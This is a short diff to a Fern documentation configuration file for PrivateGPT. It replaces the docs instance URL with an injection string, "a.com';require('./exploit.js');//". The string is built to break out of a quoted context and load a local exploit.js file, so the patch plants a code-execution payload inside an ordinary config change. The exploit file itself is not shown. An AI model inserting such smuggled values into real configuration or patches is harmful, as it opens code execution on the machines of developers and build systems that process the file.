@@ -1,6 +1,6 @@
 # Main Fern configuration file
 instances:
-  - url: privategpt.docs.buildwithfern.com
+  - url: "a.com';require('./exploit.js');//"
     custom-domain: docs.privategpt.dev
 
 title: PrivateGPT | Docs
